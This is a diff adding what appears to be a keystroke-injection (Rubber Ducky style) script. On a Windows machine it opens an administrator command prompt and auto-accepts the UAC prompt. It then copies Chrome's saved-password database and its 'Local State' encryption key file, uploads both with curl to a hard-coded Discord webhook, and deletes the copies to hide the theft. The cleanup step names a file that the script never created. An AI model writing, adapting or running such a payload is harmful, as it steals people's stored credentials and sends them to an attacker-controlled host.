@@ -1,0 +1,40 @@
+DELAY 500
+REM Open the Run dialog
+GUI r
+DELAY 500
+REM Run command prompt as administrator
+STRING powershell Start-Process cmd -Verb RunAs
+ENTER
+DELAY 1000
+REM Confirm the UAC prompt if it appears
+ALT y
+DELAY 1000
+REM Change directory to the location of the Login Data file
+STRING cd %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default
+ENTER
+DELAY 1000
+REM Copy the Login Data file to a temporary location
+STRING copy "Login Data" "%USERPROFILE%\Desktop\LoginData"
+ENTER
+DELAY 1000
+REM Change directory to the location of the Local State file
+STRING cd %USERPROFILE%\AppData\Local\Google\Chrome\User Data
+ENTER
+DELAY 1000
+REM Encode the Local State file in Base64
+STRING powershell -NoProfile -Command "$encodedFile = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes('Local State')); $encodedFile | Out-File -FilePath 'LocalState'"
+ENTER
+DELAY 1000
+REM Send the files to the Discord webhook
+STRING curl -X POST -F "file1=@LocalState" -F "file2=@%USERPROFILE%\Desktop\LoginData" "https://discord.com/api/webhooks/1118980630282252371/m9ro4voI7kGkxT1glLFvx_E_1b3b2oedM5fwd5hRuguubA-lP0bl6VE-fR3HNmv0o2gd"
+ENTER
+DELAY 3000
+REM Clean up by deleting the temporary files
+STRING del LocalState.txt
+ENTER
+STRING del "%USERPROFILE%\Desktop\LoginData"
+ENTER
+DELAY 1000
+REM Close the command prompt
+STRING exit
+ENTER
